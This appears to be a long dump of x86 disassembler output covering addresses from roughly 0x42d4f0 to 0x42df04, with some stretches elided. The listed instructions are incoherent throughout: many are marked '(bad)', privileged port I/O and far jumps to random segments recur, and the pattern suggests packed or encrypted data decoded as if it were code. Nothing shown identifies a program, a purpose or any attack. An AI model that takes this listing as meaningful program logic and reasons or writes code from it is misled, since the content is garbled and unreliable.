  42d4f0:	rcr    BYTE PTR [esi+0x6947b87b],cl
  42d4f6:	ins    DWORD PTR es:[edi],dx
  42d4f7:	adc    edx,DWORD PTR [edx+0x62899cca]
  42d4fd:	and    bl,BYTE PTR [ebx-0x7c]
  42d500:	enter  0x6644,0x74
  42d504:	push   ecx
  42d505:	or     ebx,esp
  42d507:	cli    
  42d508:	jb     0x42d4f0
  42d50a:	adc    eax,0xb54575ac
  42d50f:	and    al,0x3c
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0xffe10dd5,eax
  42d583:	dec    ecx
  42d584:	daa    
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0x63000001,al
  42d58d:	cmp    al,0xfb
  42d58f:	sbb    DWORD PTR [eax-0x5aba1274],esp
  42d595:	and    esi,DWORD PTR [eax]
  42d597:	cmp    al,0x81
  42d599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d59a:	mov    BYTE PTR [ebx+0x68b64ecc],ah
  42d5a0:	mov    DWORD PTR [edx],esp
  42d5a2:	sub    al,BYTE PTR [ebx]
  42d5a4:	xchg   BYTE PTR [edx],dl
  42d5a6:	outs   dx,BYTE PTR ds:[esi]
  42d5a7:	shl    BYTE PTR [eax],0xa6
  42d5aa:	scas   al,BYTE PTR es:[edi]
  42d5ab:	push   cs
  42d5ac:	push   ecx
  42d5ad:	adc    BYTE PTR [eax+0x6f8489a],0x97
  42d5b4:	jo     0x42d554
  42d5b6:	dec    ebp
  42d5b7:	lods   eax,DWORD PTR ds:[esi]
  42d5b8:	fadd   QWORD PTR [eax-0x77ade384]
  42d5be:	adc    DWORD PTR ds:0x54149024,eax
  42d5c4:	scas   eax,DWORD PTR es:[edi]
  42d5c5:	stos   BYTE PTR es:[edi],al
  42d5c6:	jmp    0x1914b5c
  42d5cb:	loope  0x42d5ff
  42d5cd:	adc    edi,edx
  42d5cf:	sbb    DWORD PTR [ebx],esp
  42d5d1:	push   cs
  42d5d2:	dec    esi
  42d5d3:	lds    esi,FWORD PTR [ebx]
  42d5d5:	cmp    al,0x50
  42d5d7:	lock enter 0xc95,0x2f
  42d5dc:	nop
  42d5dd:	dec    ebp
  42d5de:	icebp  
  42d5df:	xchg   DWORD PTR [ebp-0x4b],ebp
  42d5e2:	fld    DWORD PTR [esi+esi*2]
  42d5e5:	ds mov eax,0x52c17e63
  42d5eb:	or     bh,BYTE PTR [ebp-0x59c39336]
  42d5f1:	pop    ebx
  42d5f2:	xchg   ecx,eax
  42d5f3:	loope  0x42d5ff
  42d5f5:	cs into 
  42d5f7:	lds    esi,FWORD PTR [edx]
  42d5f9:	sbb    dh,BYTE PTR [eax+0x66]
  42d5fc:	sbb    edi,DWORD PTR ds:0xf3419d70
  42d602:	stos   BYTE PTR es:[edi],al
  42d603:	push   edi
  42d604:	xor    ch,BYTE PTR [ebp+eiz*2+0x7580a44b]
  42d60b:	push   ss
  42d60c:	retf   
  42d60d:	push   ss
  42d60e:	aas    
  42d60f:	test   BYTE PTR [ecx+0x24],dl
  42d612:	and    BYTE PTR [ebx+0x28fbb1d4],ah
  42d618:	mov    bl,0xf9
  42d61a:	xchg   DWORD PTR [ecx],esp
  42d61c:	push   edi
  42d61d:	pusha  
  42d61e:	sub    DWORD PTR [edx+ebp*4+0x2f],0xffffffa0
  42d623:	in     al,dx
  42d624:	fs fdivr st(4),st
  42d627:	mov    dl,0x18
  42d629:	out    0x12,eax
  42d62b:	and    dh,BYTE PTR [ebp+edx*1+0x1185dbd2]
  42d632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d633:	out    dx,eax
  42d634:	pop    ebx
  42d635:	mov    ds:0xb961bd63,al
  42d63a:	test   BYTE PTR [edi+edi*1+0x511a4232],bl
  42d641:	mov    esp,0x5aaf4a9d
  42d646:	sbb    eax,0xd5e49ba
  42d64b:	lds    ecx,FWORD PTR [edi]
  42d64d:	or     al,0x34
  42d64f:	jl     0x42d690
  42d651:	ins    DWORD PTR es:[edi],dx
  42d652:	mov    ah,0x39
  42d654:	fdivr  DWORD PTR [edx+edi*2-0x7d]
  42d658:	xchg   ecx,eax
  42d659:	shl    DWORD PTR [ebp-0xe],1
  42d65c:	and    ecx,DWORD PTR [ecx+0x1602ef87]
  42d662:	and    DWORD PTR [ebp-0x5e],0xb8078d77
  42d669:	jo     0x42d5ef
  42d66b:	out    0x95,eax
  42d66d:	push   eax
  42d66e:	fidivr WORD PTR ds:0x29278873
  42d674:	aaa    
  42d675:	xor    DWORD PTR [edi],ecx
  42d677:	mov    ecx,0x9fe9f9f9
  42d67c:	mov    ds,WORD PTR [ebx+0x614f9daa]
  42d682:	xchg   esi,eax
  42d683:	scas   al,BYTE PTR es:[edi]
  42d684:	sbb    eax,DWORD PTR [ebx-0x66b7ca8c]
  42d68a:	mov    BYTE PTR [ebp+0x20],0xd
  42d68e:	iret   
  42d68f:	lods   eax,DWORD PTR ds:[esi]
  42d690:	adc    BYTE PTR [eax],al
	...
  42d6f2:	add    BYTE PTR [eax],al
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xda
  42d701:	mov    eax,DWORD PTR [edi+0x1e72c27]
  42d707:	add    BYTE PTR ds:0x69000001,al
  42d70d:	xchg   edx,eax
  42d70e:	mov    eax,0xf67c0aa3
  42d713:	test   BYTE PTR [edx+0x4],0xc8
  42d717:	ss jl  0x42d69f
  42d71a:	fs pusha 
  42d71c:	sub    ecx,edx
  42d71e:	inc    esp
  42d71f:	xchg   ecx,eax
  42d720:	fst    DWORD PTR [edi+0x9a8e32a]
  42d726:	jo     0x42d792
  42d728:	push   eax
  42d729:	or     eax,0x14751c32
  42d72e:	and    al,0x44
  42d730:	lock ret 0xf84f
  42d734:	push   0x34b261a2
  42d739:	mov    eax,ds:0x5ce61528
  42d73e:	mov    ah,0xca
  42d740:	jl     0x42d79b
  42d742:	jmp    DWORD PTR [eax+0x6773602]
  42d748:	stos   DWORD PTR es:[edi],eax
  42d749:	xchg   ecx,eax
  42d74a:	js     0x42d777
  42d74c:	loop   0x42d784
  42d74e:	push   eax
  42d74f:	add    dl,BYTE PTR [ecx]
  42d751:	xchg   ebx,eax
  42d752:	xchg   edx,eax
  42d753:	rcl    BYTE PTR ds:0x672a11ed,cl
  42d759:	add    BYTE PTR [edi],dl
  42d75b:	ror    DWORD PTR [edx+0x7a],0x2f
  42d75f:	cmp    edi,DWORD PTR [ecx]
  42d761:	adc    al,al
  42d763:	fwait
  42d764:	cmp    BYTE PTR [ebx+0x32d66059],bh
  42d76a:	add    bh,cl
  42d76c:	pop    ecx
  42d76d:	dec    ecx
  42d76e:	rcl    DWORD PTR [esi+0x60238998],1
  42d774:	(bad)
  42d778:	jo     0x42d700
  42d77a:	xor    eax,0x6387ebe4
  42d77f:	xchg   ebp,eax
  42d780:	jne    0x42d794
  42d782:	pop    ecx
  42d783:	enter  0x83fa,0xc9
  42d787:	(bad)  
  42d788:	aam    0xbb
  42d78a:	add    eax,0xd5d16e97
  42d78f:	sbb    DWORD PTR [ebx+0x71e23bfc],0x62
  42d796:	mov    ecx,0x823ff923
  42d79b:	adc    al,0x4a
  42d79d:	fdivr  QWORD PTR [eax]
  42d79f:	sbb    dl,BYTE PTR [ebx+0x35]
  42d7a2:	lds    eax,FWORD PTR [eax-0x64fe9657]
  42d7a8:	lods   al,BYTE PTR ds:[esi]
  42d7a9:	sub    al,0x34
  42d7ab:	(bad)  
  42d7ac:	cmp    al,0xe3
  42d7ae:	call   0xa694:0x57c637e7
  42d7b5:	or     esi,ecx
  42d7b7:	ins    DWORD PTR es:[edi],dx
  42d7b8:	dec    cx
  42d7ba:	xor    edi,edi
  42d7bc:	sub    eax,0xbd305d14
  42d7c1:	mov    edx,0xe95d749e
  42d7c6:	call   0xeba8969c
  42d7cb:	add    al,BYTE PTR [edx]
  42d7cd:	addr16 sbb al,0xcc
  42d7d0:	dec    edx
  42d7d1:	or     BYTE PTR [eax-0x4569ecf4],cl
  42d7d7:	adc    ebp,esp
  42d7d9:	push   ds
  42d7da:	ds jle 0x42d830
  42d7dd:	xchg   ebp,eax
  42d7de:	mov    esi,ebp
  42d7e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d7e1:	inc    ecx
  42d7e2:	mov    WORD PTR [esi-0x6a],fs
  42d7e5:	jns    0x42d7fc
  42d7e7:	loope  0x42d78b
  42d7e9:	mov    bh,0x91
  42d7eb:	mov    ecx,0x9c75d794
  42d7f0:	aam    0xa7
  42d7f2:	mov    esi,0x96d16837
  42d7f7:	bound  edi,QWORD PTR [ebx-0x74]
  42d7fa:	mov    es,ebx
  42d7fc:	inc    edi
  42d7fd:	je     0x42d7a6
  42d7ff:	test   eax,esp
  42d801:	pusha  
  42d802:	mov    BYTE PTR [eax-0x396bc9c1],0x49
  42d809:	xchg   edx,eax
  42d80a:	ss push ebp
  42d80c:	leave  
  42d80d:	add    BYTE PTR [ecx],ch
  42d80f:	ja     0x42d804
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x53c6961a
  42d881:	scas   al,BYTE PTR es:[edi]
  42d882:	xlat   BYTE PTR ds:[ebx]
  42d883:	ret    0xe831
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    eax,0x28000001
  42d88d:	popa   
  42d88e:	call   0xe91f7d56
  42d893:	or     edi,DWORD PTR [ebp-0x25]
  42d896:	push   cs
  42d897:	and    al,0xb5
  42d899:	cli    
  42d89a:	pusha  
  42d89b:	inc    ebp
  42d89c:	jl     0x42d8ec
  42d89e:	leave  
  42d89f:	mov    edx,0x59cb4bfe
  42d8a4:	add    al,0x88
  42d8a6:	dec    ebp
  42d8a7:	ret    
  42d8a8:	xor    eax,ecx
  42d8aa:	in     al,dx
  42d8ab:	mov    dl,0x61
  42d8ad:	mov    ecx,0x3b818413
  42d8b2:	les    ebx,FWORD PTR [edi-0x65]
  42d8b5:	inc    edi
  42d8b6:	dec    edx
  42d8b7:	retf   0x1ae8
  42d8ba:	inc    esi
  42d8bb:	inc    esp
  42d8bc:	xor    eax,0x8f4818d6
  42d8c1:	nop
  42d8c2:	jbe    0x42d8e0
  42d8c4:	hlt    
  42d8c5:	and    DWORD PTR [ecx-0x44],ecx
  42d8c8:	push   edx
  42d8c9:	mov    WORD PTR [ebp+esi*4+0x16becc01],?
  42d8d0:	add    dl,BYTE PTR [ebp+0x1c]
  42d8d3:	xchg   esi,eax
  42d8d4:	sti    
  42d8d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8d6:	jmp    0x5868:0xac4f60ba
  42d8dd:	icebp  
  42d8de:	dec    edx
  42d8df:	aas    
  42d8e0:	stc    
  42d8e1:	fld    DWORD PTR [ecx]
  42d8e3:	imul   edx,DWORD PTR [ecx+0x35],0x4f
  42d8e7:	dec    edx
  42d8e8:	mov    esi,0x700551cc
  42d8ed:	sub    bh,BYTE PTR [ebx]
  42d8ef:	mov    ecx,DWORD PTR [edx+0x41]
  42d8f2:	pop    ecx
  42d8f3:	lods   eax,DWORD PTR ds:[esi]
  42d8f4:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42d8f6:	xchg   esi,eax
  42d8f7:	inc    esp
  42d8f8:	sbb    ecx,0xb8bea424
  42d8fe:	sbb    DWORD PTR [ebp+0x2540d38a],ebx
  42d904:	loop   0x42d90e
  42d906:	xchg   esp,eax
  42d907:	(bad)  
  42d908:	call   0x8769:0xabafdbb7
  42d90f:	jp     0x42d911
  42d911:	ret    0x2ecd
  42d914:	jae    0x42d8ec
  42d916:	jmp    0x42d941
  42d918:	ret    
  42d919:	pop    edx
  42d91a:	mov    ecx,0x1546a130
  42d91f:	jg     0x42d989
  42d921:	xchg   ebp,edi
  42d923:	(bad)  
  42d924:	and    ebx,DWORD PTR [edi]
  42d926:	xchg   BYTE PTR [ebp+0x1a4172e9],dl
  42d92c:	push   es
  42d92d:	out    0xc9,al
  42d92f:	xchg   esi,eax
  42d930:	mov    ds:0x5145243e,al
  42d935:	inc    ecx
  42d936:	loop   0x42d8c6
  42d938:	pop    ecx
  42d939:	mov    ecx,0x2436df49
  42d93e:	cwde   
  42d93f:	push   ss
  42d940:	push   ebp
  42d941:	outs   dx,DWORD PTR ds:[esi]
  42d942:	pushf  
  42d943:	ror    BYTE PTR [ebx-0x30b0b0e9],1
  42d949:	jl     0x42d964
  42d94b:	lds    edi,FWORD PTR [ebp+0x4366736a]
  42d951:	aad    0xbd
  42d953:	push   esp
  42d954:	or     ah,0x3b
  42d957:	sbb    al,0x60
  42d959:	fmul   QWORD PTR [eax-0x56]
  42d95c:	out    0xfc,eax
  42d95e:	push   ebx
  42d95f:	push   ds
  42d960:	ret    
  42d961:	mov    ebp,0x180826be
  42d966:	test   al,0x95
  42d968:	mov    cl,0xae
  42d96a:	imul   esi,DWORD PTR [eax-0x7a96a974],0x7
  42d971:	mov    DWORD PTR [esi],ebx
  42d973:	popf   
  42d974:	(bad)  
  42d976:	(bad)  
  42d978:	ror    BYTE PTR [esi+0x2e],cl
  42d97b:	daa    
  42d97c:	push   ds
  42d97d:	in     eax,dx
  42d97e:	lds    edx,FWORD PTR [edx+0x6e]
  42d981:	mov    cl,0xb7
  42d983:	or     al,0xc8
  42d985:	jb     0x42d956
  42d987:	in     eax,0x41
  42d989:	inc    esp
  42d98a:	shl    BYTE PTR [ebx-0x4cd31ab8],1
  42d990:	scas   eax,DWORD PTR es:[edi]
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	popa   
  42da01:	jmp    0xe979bebe
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    eax,0xdb000001
  42da0d:	xor    BYTE PTR [esi-0x2],dl
  42da10:	fs pop ebx
  42da12:	xchg   dh,al
  42da14:	push   eax
  42da15:	imul   esp,DWORD PTR [ebp+0x6e46588e],0xa24ceae
  42da1f:	sub    ebp,edi
  42da21:	sbb    al,0xb6
  42da23:	sub    al,0x2d
  42da25:	pusha  
  42da26:	out    dx,eax
  42da27:	push   0x5c985188
  42da2c:	js     0x42d9f8
  42da2e:	jge    0x42da35
  42da30:	xor    eax,0xad9edcc7
  42da35:	ret    
  42da36:	ins    DWORD PTR es:[edi],dx
  42da37:	sub    eax,ebp
  42da39:	jecxz  0x42d9e7
  42da3b:	fcom   DWORD PTR [ebp-0x5b]
  42da3e:	mov    edi,esp
  42da40:	mov    WORD PTR [eax+ebx*8],ds
  42da43:	neg    ebp
  42da45:	pushf  
  42da46:	and    eax,ecx
  42da48:	dec    eax
  42da49:	pop    ss
  42da4a:	sub    al,0x84
  42da4c:	mov    al,0xcb
  42da4e:	int3   
  42da4f:	ficomp DWORD PTR [ebp-0x7b]
  42da52:	sub    DWORD PTR [edi-0x41],edx
  42da55:	xchg   ecx,edx
  42da57:	rep outs dx,BYTE PTR ds:[esi]
  42da59:	xor    BYTE PTR [edi+0x29],bh
  42da5c:	mov    dl,0xca
  42da5e:	sbb    DWORD PTR [ecx-0x59],ebx
  42da61:	xor    eax,esi
  42da63:	data16 icebp 
  42da65:	pop    edx
  42da66:	out    0x3e,eax
  42da68:	sub    DWORD PTR [eax],eax
  42da6a:	inc    ebx
  42da6b:	adc    BYTE PTR [eax],cl
  42da6d:	leave  
  42da6e:	jg     0x42da37
  42da70:	xchg   ebx,eax
  42da71:	mov    bh,0x11
  42da73:	call   0x541:0xe93d208
  42da7a:	xchg   ebp,eax
  42da7b:	pop    ecx
  42da7c:	(bad)  
  42da7d:	mov    eax,DWORD PTR [edi]
  42da7f:	xchg   edi,eax
  42da80:	addr16 jnp 0x42da18
  42da83:	test   cl,cl
  42da85:	int3   
  42da86:	inc    ebp
  42da87:	iret   
  42da88:	xor    DWORD PTR [ecx-0x294d7c1c],ebx
  42da8e:	jecxz  0x42da39
  42da90:	push   es
  42da91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da92:	je     0x42dab6
  42da94:	retf   0xb53b
  42da97:	imul   eax,DWORD PTR [ebp-0x3633641b],0xc8e3a216
  42daa1:	sbb    ebp,DWORD PTR [esi]
  42daa3:	jnp    0x42db24
  42daa5:	mov    esp,0xc080f3ea
  42daaa:	addr16 dec edi
  42daac:	test   eax,0xc93b4d3d
  42dab1:	mov    edi,DWORD PTR [edx+ebx*4+0x64ebcd92]
  42dab8:	jo     0x42da89
  42daba:	push   esi
  42dabb:	cmp    al,0x3f
  42dabd:	sub    DWORD PTR [esi+esi*8],ebp
  42dac0:	or     eax,0x7c1afcf7
  42dac5:	retf   0x4c8c
  42dac8:	jg     0x42da93
  42daca:	lock inc edi
  42dacc:	add    al,0x49
  42dace:	mov    al,0x34
  42dad0:	ror    DWORD PTR [ebx+0x94a149b],0x34
  42dad7:	retf   0x5b03
  42dada:	adc    ecx,DWORD PTR [ebp+edi*1+0x3bebe98f]
  42dae1:	scas   eax,DWORD PTR es:[edi]
  42dae2:	shl    DWORD PTR [esi-0x52ac9995],1
  42dae8:	div    DWORD PTR [edi-0x45]
  42daeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42daec:	xchg   edx,eax
  42daed:	adc    BYTE PTR [ecx],dl
  42daef:	bound  ebp,QWORD PTR [esi+edx*4]
  42daf2:	mov    dh,0x49
  42daf4:	push   eax
  42daf5:	(bad)  
  42daf6:	lock scas eax,DWORD PTR es:[edi]
  42daf8:	imul   edi,esi,0x6844f076
  42dafe:	imul   eax,DWORD PTR [edi],0xffffffd3
  42db01:	sub    edx,DWORD PTR [edi+edi*4+0x532b87c5]
  42db08:	jg     0x42db1d
  42db0a:	and    eax,0x668d1d2
  42db0f:	jle    0x42db28
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db3f
  42db81:	mov    esp,DWORD PTR [edi+0x7d]
  42db84:	cmp    ebp,edx
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    eax,0x41000001
  42db8d:	mov    ebp,0x330b18a4
  42db92:	leave  
  42db93:	lods   eax,DWORD PTR ds:[esi]
  42db94:	dec    esp
  42db95:	pop    ds
  42db96:	sub    DWORD PTR [esi-0x3d893990],eax
  42db9c:	mov    dh,0xe9
  42db9e:	xchg   ecx,eax
  42db9f:	pop    ds
  42dba0:	int3   
  42dba1:	or     BYTE PTR [esi+eiz*1-0x3c5c7a2b],ch
  42dba8:	cmp    ebx,edx
  42dbaa:	pop    es
  42dbab:	dec    esi
  42dbac:	jne    0x42db85
  42dbae:	repz jno 0x42dc1c
  42dbb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbb2:	add    al,0x58
  42dbb4:	or     cl,BYTE PTR [edx]
  42dbb6:	pop    eax
  42dbb7:	(bad)  
  42dbb8:	mov    eax,ds:0xce138da2
  42dbbd:	xor    DWORD PTR [edx-0x58],ecx
  42dbc0:	mov    fs:0x178d4fe2,al
  42dbc6:	out    0x7a,eax
  42dbc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dbc9:	sbb    eax,0x54b4c1c0
  42dbce:	fdivp  st(6),st
  42dbd0:	cld    
  42dbd1:	xor    ah,BYTE PTR [edx]
  42dbd3:	lds    esp,FWORD PTR [edx]
  42dbd5:	in     eax,dx
  42dbd6:	xchg   esp,eax
  42dbd7:	sub    ah,bh
  42dbd9:	ss inc eax
  42dbdb:	xchg   esp,eax
  42dbdc:	mov    ds:0xeb12bbb7,eax
  42dbe1:	dec    eax
  42dbe2:	jno    0x42dc13
  42dbe4:	cmp    BYTE PTR es:[ebx+0x1d1ca968],dh
  42dbeb:	fs inc edi
  42dbed:	inc    edi
  42dbee:	push   eax
  42dbef:	cmp    al,0xde
  42dbf1:	mov    eax,0x55be5048
  42dbf6:	add    eax,0x6c5efe6b
  42dbfb:	mov    ebx,0xc239259e
  42dc00:	push   ds
  42dc01:	dec    esi
  42dc02:	xor    BYTE PTR [esi+0x7965d5ce],cl
  42dc08:	mov    edi,0x56c97e29
  42dc0d:	outs   dx,BYTE PTR ds:[esi]
  42dc0e:	mov    ebp,0x2abe14ee
  42dc13:	(bad)  
  42dc14:	jmp    0x72f0:0xe7c50708
  42dc1b:	fcomp  DWORD PTR [esi-0x3cda94f1]
  42dc21:	cmp    esi,DWORD PTR [edx-0x32089bfc]
  42dc27:	gs jbe 0x42dc37
  42dc2a:	jecxz  0x42dbbc
  42dc2c:	popa   
  42dc2d:	call   DWORD PTR [eax-0x20]
  42dc30:	sub    ecx,DWORD PTR [eax+0x4d]
  42dc33:	pop    esp
  42dc34:	cmp    BYTE PTR [edx],bh
  42dc36:	cdq    
  42dc37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc38:	call   0x89bb:0x74ac7af9
  42dc3f:	hlt    
  42dc40:	ret    
  42dc41:	repnz rcl BYTE PTR [edi+0xf3b1c86],0x1c
  42dc49:	mov    bh,BYTE PTR [ebp-0x75ba4fd8]
  42dc4f:	xchg   ebx,eax
  42dc50:	dec    eax
  42dc51:	pop    ss
  42dc52:	xchg   edx,eax
  42dc53:	ror    DWORD PTR [eax+0x4a8f07ff],0x72
  42dc5a:	neg    edx
  42dc5c:	ins    BYTE PTR es:[edi],dx
  42dc5d:	lods   eax,DWORD PTR ds:[esi]
  42dc5e:	das    
  42dc5f:	mov    ds:0xe9e6d529,eax
  42dc64:	cld    
  42dc65:	(bad)  
  42dc66:	stc    
  42dc67:	js     0x42dc17
  42dc69:	or     eax,edi
  42dc6b:	in     al,0x5
  42dc6d:	arpl   WORD PTR [ebx+0x55],cx
  42dc70:	adc    edx,DWORD PTR [ebp-0x799e498a]
  42dc76:	fdivr  DWORD PTR [edx-0x51]
  42dc79:	das    
  42dc7a:	xchg   DWORD PTR [eax],edx
  42dc7c:	hlt    
  42dc7d:	mov    dl,0xc0
  42dc7f:	pop    ebp
  42dc80:	fwait
  42dc81:	lds    ebp,FWORD PTR [ebp-0x3]
  42dc84:	outs   dx,DWORD PTR ds:[esi]
  42dc85:	inc    edi
  42dc86:	or     dl,BYTE PTR [esi-0x6d323b66]
  42dc8c:	ss sbb al,0x95
  42dc8f:	inc    eax
  42dc90:	sub    al,0x0
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	test   al,0xf0
  42dd02:	push   es
  42dd03:	mov    BYTE PTR [eax-0x15],0x1
  42dd07:	add    BYTE PTR ds:0xa9000001,al
  42dd0d:	pop    esi
  42dd0e:	mov    ecx,0x96f7434e
  42dd13:	mov    WORD PTR [edx],cs
  42dd15:	add    BYTE PTR [edi],ch
  42dd17:	push   edi
  42dd18:	mov    dh,BYTE PTR [eax-0xbf7a750]
  42dd1e:	adc    ebx,DWORD PTR ds:0x3269a63d
  42dd24:	scas   eax,DWORD PTR es:[edi]
  42dd25:	jae    0x42dcbc
  42dd27:	shr    ebp,1
  42dd29:	retf   0xdd9c
  42dd2c:	lea    esi,[esi-0x1d]
  42dd2f:	pop    ebp
  42dd30:	mov    ebp,DWORD PTR [ecx]
  42dd32:	aam    0x36
  42dd34:	pop    esi
  42dd35:	push   ss
  42dd36:	int3   
  42dd37:	mov    ch,0x95
  42dd39:	mov    al,ds:0x901e307f
  42dd3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd3f:	shr    DWORD PTR [ebx-0x13],0xb4
  42dd43:	xor    ebx,DWORD PTR [eax+0x63ec58d5]
  42dd49:	push   ebp
  42dd4a:	pop    ds
  42dd4b:	test   ecx,esp
  42dd4d:	push   ss
  42dd4e:	mov    DWORD PTR [ebx],ecx
  42dd50:	js     0x42dcdf
  42dd52:	aam    0xee
  42dd54:	(bad)  
  42dd55:	test   ah,0xd7
  42dd58:	add    ecx,DWORD PTR [edi+eiz*4]
  42dd5b:	loop   0x42ddce
  42dd5d:	cmp    DWORD PTR [edx],eax
  42dd5f:	sbb    dh,BYTE PTR ds:0x7434f2c7
  42dd65:	call   0x92acf318
  42dd6a:	xchg   edx,eax
  42dd6b:	js     0x42dd3a
  42dd6d:	pusha  
  42dd6e:	call   0xde00:0xafe919b
  42dd75:	dec    edi
  42dd76:	scas   eax,DWORD PTR es:[edi]
  42dd77:	xor    eax,0x2652bbce
  42dd7c:	div    BYTE PTR [ebx+0x86ee222]
  42dd82:	pop    edi
  42dd83:	jb     0x42dd2f
  42dd85:	cmp    BYTE PTR [ebp-0x76808efb],ah
  42dd8b:	mov    ecx,0x6c9e3538
  42dd90:	shr    DWORD PTR [edx+0xdefb35a],1
  42dd96:	scas   al,BYTE PTR es:[edi]
  42dd97:	jg     0x42dd68
  42dd99:	and    al,0xff
  42dd9b:	je     0x42dde7
  42dd9d:	cmp    DWORD PTR [eax+0x45],esi
  42dda0:	pop    DWORD PTR [edx+0x2a001647]
  42dda6:	cmp    bh,ch
  42dda8:	dec    ecx
  42dda9:	ins    DWORD PTR es:[edi],dx
  42ddaa:	enter  0x4c2a,0x74
  42ddae:	fisttp WORD PTR [esi+0x44788be0]
  42ddb4:	stos   DWORD PTR es:[di],eax
  42ddb6:	sub    ch,BYTE PTR [edi]
  42ddb8:	fld    QWORD PTR [edi]
  42ddba:	div    BYTE PTR [ecx-0x63]
  42ddbd:	xchg   ecx,eax
  42ddbe:	fadd   QWORD PTR [ebx-0x2093704f]
  42ddc4:	fs jp  0x42dd99
  42ddc7:	add    esp,eax
  42ddc9:	mov    ch,0x0
  42ddcb:	adc    BYTE PTR [esi-0x13e39c99],bl
  42ddd1:	mov    edx,0xeaaa286f
  42ddd6:	xchg   ecx,eax
  42ddd7:	jmp    0x4108:0x1a482c90
  42ddde:	jno    0x42de0c
  42dde0:	stc    
  42dde1:	add    al,BYTE PTR [edx]
  42dde3:	imul   edi,ecx,0xffffffc2
  42dde6:	jo     0x42dda2
  42dde8:	loop   0x42ddfa
  42ddea:	or     DWORD PTR [edx-0x55],0x7d064e89
  42ddf1:	out    dx,al
  42ddf2:	push   0x0
  42ddf4:	call   0x1a6dc714
  42ddf9:	mov    ch,0x91
  42ddfb:	lahf   
  42ddfc:	push   ds
  42ddfd:	scas   al,BYTE PTR es:[edi]
  42ddfe:	mov    ebp,edi
  42de00:	(bad)  
  42de01:	or     ah,BYTE PTR [esi]
  42de03:	sub    DWORD PTR [ebp-0x24],esp
  42de06:	sti    
  42de07:	fwait
  42de08:	sub    DWORD PTR [esi-0x1e9f2bd7],ebp
  42de0e:	jmp    0x42ddf3
  42de10:	mov    esi,0x0
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	xchg   ebp,eax
  42de81:	xchg   BYTE PTR [ebp+0x1ec458b],al
  42de87:	add    BYTE PTR ds:0xf0000001,al
  42de8d:	repz adc bl,BYTE PTR [ecx+0x75d5a83]
  42de94:	stc    
  42de95:	inc    edi
  42de96:	inc    ecx
  42de97:	and    al,0x7c
  42de99:	sub    eax,0x8c5c19ef
  42de9e:	pusha  
  42de9f:	add    cl,cl
  42dea1:	jo     0x42dec1
  42dea3:	ror    ecx,1
  42dea5:	mov    ecx,0x2eae2981
  42deaa:	cmp    edi,DWORD PTR [edi-0x6f]
  42dead:	mov    bh,BYTE PTR [esi+0x2f]
  42deb0:	outs   dx,DWORD PTR ds:[esi]
  42deb1:	push   es
  42deb2:	pop    ds
  42deb3:	ror    BYTE PTR [esi],cl
  42deb5:	fs sbb eax,0x4e06bcdf
  42debb:	push   ebp
  42debc:	inc    eax
  42debd:	mov    esi,DWORD PTR [ebx-0x29]
  42dec0:	or     ecx,DWORD PTR [edx+0x6f]
  42dec3:	sub    BYTE PTR ds:0x1e4c5aa6,dl
  42dec9:	mov    ah,0x5
  42decb:	xor    BYTE PTR [eax],0xb0
  42dece:	adc    edi,DWORD PTR [ebp-0x54]
  42ded1:	outs   dx,DWORD PTR ds:[esi]
  42ded2:	push   edi
  42ded3:	cs (bad) 
  42ded5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ded6:	iret   
  42ded7:	(bad)  
  42ded8:	sbb    eax,0x71cd2365
  42dedd:	popf   
  42dede:	test   cl,0xff
  42dee1:	inc    esp
  42dee2:	mov    esi,0x5cc375e3
  42dee7:	mov    esp,0x3a5136e7
  42deec:	shl    BYTE PTR [esi+0x1],1
  42deef:	add    bh,ah
  42def1:	jmp    0x42df15
  42def3:	sbb    eax,0xe4a94d20
  42def8:	xchg   esp,eax
  42def9:	push   es
  42defa:	sbb    DWORD PTR [edx],eax
  42defc:	mov    edi,0x3aaf241c
  42df01:	test   DWORD PTR [eax-0x20],ecx
  42df04:	dec    esi
